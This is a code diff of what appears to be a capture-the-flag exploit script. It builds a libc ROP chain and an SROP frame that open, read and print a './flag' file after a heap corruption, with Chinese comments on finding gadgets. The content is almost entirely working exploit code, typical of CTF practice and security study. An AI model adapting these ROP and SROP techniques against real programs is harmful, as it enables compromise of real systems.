@@ -65,7 +65,7 @@ pop_rdi=libc_base+0x000000000002164f
 pop_rbp=libc_base+0x00000000000213e3
 pop_rsi=libc_base+0x0000000000023a6a
 pop_rdx=libc_base+0x0000000000001b96
-syscall=libc_base + 0x00000000000d2625
+syscall=libc_base + 0x00000000000d2625 #hex(libc.search(asm('syscall \n ret')).__next__())，不知道为什么用ROPgadget没法找到，只能用python
 read_addr=libc_base+libc.symbols['read']
 open_addr=libc_base+libc.symbols['open']
 write_addr=libc_base+libc.symbols['write']
@@ -96,23 +96,18 @@ frame.rip = leave_ret
 # edit()
 byte_frame=bytes(frame)
 print(byte_frame ,len(byte_frame),type(byte_frame))
-# gdb.attach(p,'b free')
+gdb.attach(p,'b free')
 edit(1,b'./flag\x00')
-# orw_payload=flat([0,pop_rdi,heap_addr+0x1c0,pop_rsi,0,open_addr])
-# orw_payload+=flat([0,pop_rdi,3,pop_rsi,heap_addr+0x1f0,pop_rdx,0x30,read_addr])
-# orw_payload+=flat([0,pop_rdi,1,pop_rsi,heap_addr+0x1f0,pop_rdx,0x30,write_addr])
-# orw_payload=flat([0,pop_rdi,3,pop_rax,0x2710,syscall])
-orw_payload=flat([0,pop_rdi,heap_addr+0x1c0,pop_rsi,0,pop_rax,2,syscall])
-orw_payload+=flat([pop_rdi,3,pop_rsi,heap_addr+0x1f0,pop_rdx,0x30,pop_rax,0,syscall])
-orw_payload+=flat([pop_rdi,1,pop_rsi,heap_addr+0x1f0,pop_rdx,0x30,pop_rax,1,syscall])
+#下面两种方法得到orwrop链都可以
+if 1==0:
+    orw_payload=flat([0,pop_rdi,heap_addr+0x1c0,pop_rsi,0,open_addr])
+    orw_payload+=flat([pop_rdi,3,pop_rsi,heap_addr+0x1f0,pop_rdx,0x30,read_addr])
+    orw_payload+=flat([pop_rdi,1,pop_rsi,heap_addr+0x1f0,pop_rdx,0x30,write_addr])
+else:
+    orw_payload=flat([0,pop_rdi,heap_addr+0x1c0,pop_rsi,0,pop_rax,2,syscall])
+    orw_payload+=flat([pop_rdi,3,pop_rsi,heap_addr+0x1f0,pop_rdx,0x30,pop_rax,0,syscall])
+    orw_payload+=flat([pop_rdi,1,pop_rsi,heap_addr+0x1f0,pop_rdx,0x20,pop_rax,1,syscall])
 edit(14,orw_payload)
 edit(15,byte_frame)
-# pause()
 free(15)
-# orw_payload=
-# edit(11,orw_payload)
 p.interactive()
-
-
-# 2020E0
-# libc.search(asm("pop rdi\nret")).__next__(), #: pop rdi; ret;
